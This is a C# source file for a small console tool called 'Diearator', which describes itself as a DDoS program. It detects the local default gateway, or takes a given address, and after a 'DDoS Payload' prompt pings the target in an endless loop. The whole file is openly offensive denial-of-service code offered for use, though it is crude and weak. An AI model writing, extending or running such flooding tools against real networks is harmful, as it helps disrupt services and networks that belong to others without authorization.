using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace diearatorLog
{
    class Diearator
    {
         public static bool attack = true;

        internal static string Scan()
        {
            DieActiv();
            Console.WriteLine("Scaning...");

            System.Net.NetworkInformation.Ping p = new System.Net.NetworkInformation.Ping();
            IPAddress midadress = GetDefaultGateway();
            string midadress2 = midadress.ToString();
            System.Net.NetworkInformation.PingReply rep = p.Send(midadress2);
            if (rep.Status == System.Net.NetworkInformation.IPStatus.Success)
            {
                Console.WriteLine("Host found at:" + midadress2);
                return midadress2;

            }
            else { return "error"; }
        }
        public static void DieActiv()
        {
            Console.WriteLine("████████████████████████");
            Console.WriteLine("█Diearator activated...█");
            Console.WriteLine("█████████████████████████████████");
            Console.WriteLine("██    VESION 1.44               █");
            Console.WriteLine("██   © AMIDIBOSS 2017           █");
            Console.WriteLine("█████████████████████████████████");
            return;
        }

        internal static void denyIp(string adr)
        {
            DieActiv();
            Console.WriteLine("Step 1: DDoS Scanning");
            Console.WriteLine("Adress recieved!");
            Console.WriteLine("Step 2: DDoS Payload");
            System.Net.NetworkInformation.Ping p03 = new System.Net.NetworkInformation.Ping();
            Console.WriteLine("Press any key to begin payload...");
            Console.ReadKey();
            bool attack = true;
            while (attack == true)
            {
                System.Net.NetworkInformation.PingReply rep04 = p03.Send(adr, 2000);
                if (rep04.Status == System.Net.NetworkInformation.IPStatus.Success) { Console.WriteLine("Sent..."); }
            }
        }

        internal static void denyhost(bool mode)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;

            DieActiv();
            Console.WriteLine("Step 1: DDoS Scanning");
            Console.WriteLine("Scaning...");

            System.Net.NetworkInformation.Ping p02 = new System.Net.NetworkInformation.Ping();
            IPAddress midadress02 = GetDefaultGateway();
            string midadress22 = midadress02.ToString();
            System.Net.NetworkInformation.PingReply rep02 = p02.Send(midadress22);
            if (rep02.Status == System.Net.NetworkInformation.IPStatus.Success)
            {
                Console.WriteLine("Host found at:" + midadress22);
                Console.WriteLine("Step 2: DDoS Payload");
                if (mode == true)
                {
                    Console.WriteLine("Press any key to begin payload...");
                    Console.ReadKey();
                }
                
                while (attack == true)
                {
                    System.Net.NetworkInformation.PingReply rep03 = p02.Send(midadress22, 2000);
                    if (rep03.Status == System.Net.NetworkInformation.IPStatus.Success) { Console.WriteLine("Sent..."); }
                }
                Console.ReadKey();
            }
        }

        public static IPAddress GetDefaultGateway()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .FirstOrDefault(a => a != null);
        }
    }
}
